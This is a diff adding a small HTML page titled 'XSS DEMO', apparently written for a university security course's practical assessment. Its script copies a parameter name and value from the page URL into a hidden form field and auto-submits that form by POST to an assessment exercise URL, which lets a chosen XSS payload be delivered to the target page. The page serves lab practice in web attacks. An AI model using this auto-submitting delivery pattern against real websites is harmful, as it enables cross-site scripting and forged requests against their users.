@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>XSS DEMO</title>
+</head>
+
+<body>
+    <form id="TheForm" action="" method="post">
+        <input id="payload" type="hidden" name="payload" value="">
+    </form>
+
+    <script>
+        //URL for this page: 
+        // Get the GET parameters from the URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const exNumG = urlParams.get("exnum");
+        const nameG = urlParams.get("name");
+        const valueG = urlParams.get("value");
+
+        // Set the "name" and "value" in the form field
+        const payloadInput = document.getElementById("payload");
+        payloadInput.name = nameG;
+        payloadInput.value = valueG;
+
+        // Automatically submit the form
+        const form = document.getElementById("TheForm");
+        form.action = `https://inte2102.semiregular.space/Practical_Assessment/1/XSS/{2db1dfa5-865a-4d29-9420-82e96afde95e}/ex${exNumG}/`;
+
+        // Automatically submit the form
+        form.submit();
+    </script>
+</body>
+
+</html>
